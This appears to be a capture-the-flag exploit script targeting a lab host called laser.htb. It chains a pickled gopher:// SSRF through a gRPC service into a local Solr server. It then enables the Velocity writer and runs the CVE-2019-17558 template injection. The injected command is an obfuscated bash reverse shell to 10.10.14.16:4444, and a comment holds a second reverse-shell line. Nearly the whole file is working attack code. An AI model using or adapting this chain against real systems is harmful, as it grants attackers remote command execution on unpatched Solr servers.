import sys
import pickle
import base64
import subprocess

#https://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py 
#bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
grpcurl_loc = '/home/kali/tools/grpcurl_170/grpcurl'
 
payload = 'bash -c {echo,' +base64.b64encode("bash -i >& /dev/tcp/10.10.14.16/4444 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}'

def send_payload(url):
    feed_url = '{"feed_url":"gopher://localhost:8983/_' + url +'"}'
    print (feed_url)
    payload = base64.b64encode(pickle.dumps(feed_url))
    cmd = grpcurl_loc + ' -max-time 5 -plaintext -proto pig.proto -d \'{"data":"' + payload + '"}\' laser.htb:9000 Print.Feed'
    subprocess.call(cmd,shell=True)


def enc(data):
    return str(data.replace('%','%25').replace('\n',"%0d%0a").replace('"','\\"'))

def url_get(header,req):
    send_payload(enc(req) + enc(header))

def url_post(header,body):
    send_payload(enc(header)+ "%0d%0a%0d%0a" + enc(body))

body = """
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}""".strip().replace('\n','').replace(' ','')


header="""
POST /solr/staging/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: {}
""".format(len(body)).strip()

url_post(header,body)

header = ' HTTP/1.1\nHost: localhost:8983\n'
template = '%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec("PLACEHOLDER"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end' 
request = 'GET /solr/staging/select?q=1&wt=velocity&v.template=custom&v.template.custom=' + template.replace("PLACEHOLDER",payload).replace(' ','%20')


url_get(header,request)
